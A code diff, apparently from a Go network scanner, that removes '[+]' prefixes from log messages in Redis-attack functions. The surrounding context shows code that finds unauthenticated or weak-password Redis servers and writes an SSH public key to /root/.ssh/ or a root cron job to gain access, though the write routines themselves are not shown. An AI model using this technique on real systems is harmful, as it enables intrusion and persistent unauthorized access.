@@ -77,11 +77,11 @@ func RedisConn(Host, Port, pass string) (flag bool, err error) {
 		flag = true
 		dbfilename, dir, err = getconfig(conn)
 		if err != nil {
-			result := fmt.Sprintf("[+] Redis:%s %s", realhost, pass)
+			result := fmt.Sprintf("Redis:%s %s", realhost, pass)
 			logger.Success(result)
 			return flag, err
 		} else {
-			result := fmt.Sprintf("[+] Redis:%s %s file:%s/%s", realhost, pass, dir, dbfilename)
+			result := fmt.Sprintf("Redis:%s %s file:%s/%s", realhost, pass, dir, dbfilename)
 			logger.Success(result)
 		}
 		err = Expoilt(realhost, conn)
@@ -117,11 +117,11 @@ func RedisUnauth(Host, Port string) (flag bool, err error) {
 		flag = true
 		dbfilename, dir, err = getconfig(conn)
 		if err != nil {
-			result := fmt.Sprintf("[+] Redis:%s unauthorized", realhost)
+			result := fmt.Sprintf("Redis:%s unauthorized", realhost)
 			logger.Success(result)
 			return flag, err
 		} else {
-			result := fmt.Sprintf("[+] Redis:%s unauthorized file:%s/%s", realhost, dir, dbfilename)
+			result := fmt.Sprintf("Redis:%s unauthorized file:%s/%s", realhost, dir, dbfilename)
 			logger.Success(result)
 		}
 		err = Expoilt(realhost, conn)
@@ -135,7 +135,7 @@ func Expoilt(realhost string, conn net.Conn) error {
 		return err
 	}
 	if flagSsh == true {
-		result := fmt.Sprintf("[+] Redis:%v like can write /root/.ssh/", realhost)
+		result := fmt.Sprintf("Redis:%v like can write /root/.ssh/", realhost)
 		logger.Success(result)
 		if common.RunningInfo.RedisFile != "" {
 			writeok, text, err := writekey(conn, common.RunningInfo.RedisFile)
@@ -144,7 +144,7 @@ func Expoilt(realhost string, conn net.Conn) error {
 				return err
 			}
 			if writeok {
-				result := fmt.Sprintf("[+] %v SSH public key was written successfully", realhost)
+				result := fmt.Sprintf("%v SSH public key was written successfully", realhost)
 				logger.Success(result)
 			} else {
 				fmt.Println("[-] Redis:", realhost, "SSHPUB write failed", text)
@@ -153,7 +153,7 @@ func Expoilt(realhost string, conn net.Conn) error {
 	}
 
 	if flagCron == true {
-		result := fmt.Sprintf("[+] Redis:%v like can write /var/spool/cron/", realhost)
+		result := fmt.Sprintf("Redis:%v like can write /var/spool/cron/", realhost)
 		logger.Success(result)
 		if common.RunningInfo.RedisShell != "" {
 			writeok, text, err := writecron(conn, common.RunningInfo.RedisShell)
@@ -161,7 +161,7 @@ func Expoilt(realhost string, conn net.Conn) error {
 				return err
 			}
 			if writeok {
-				result := fmt.Sprintf("[+] %v /var/spool/cron/root was written successfully", realhost)
+				result := fmt.Sprintf("%v /var/spool/cron/root was written successfully", realhost)
 				logger.Success(result)
 			} else {
 				fmt.Println("[-] Redis:", realhost, "cron write failed", text)
